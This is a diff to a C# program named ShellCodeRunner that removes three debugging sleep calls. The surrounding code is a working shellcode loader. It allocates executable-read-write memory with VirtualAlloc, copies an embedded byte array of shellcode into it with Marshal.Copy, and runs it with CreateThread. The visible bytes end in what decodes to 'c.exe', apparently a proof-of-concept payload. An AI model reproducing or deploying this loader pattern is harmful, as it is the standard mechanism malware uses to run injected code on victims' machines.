@@ -72,9 +72,6 @@ namespace ShellCodeRunner
                  0x63,0x2e,0x65,0x78,0x65,0x00
              };
 
-            // debug
-            Thread.Sleep(1000);
-
             Console.WriteLine("[*] Calling VirtualAlloc() to allocate memory...");
             IntPtr funcAddr = VirtualAlloc(
                               IntPtr.Zero,
@@ -82,19 +79,13 @@ namespace ShellCodeRunner
                               (uint)StateEnum.MEM_COMMIT,
                               (uint)Protection.PAGE_EXECUTE_READWRITE);
 
-            // debug
-            Thread.Sleep(1000);
-
             Console.WriteLine("[*] Copying shellcode to memory address with Marshal.Copy()...");
             Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
 
             IntPtr hThread = IntPtr.Zero;
             uint threadId = 0;
             IntPtr pinfo = IntPtr.Zero;
-
-            // debug
-            Thread.Sleep(1000);
-
+            
             Console.WriteLine("[*] Calling CreateThread() to run shellcode...");
             hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
 
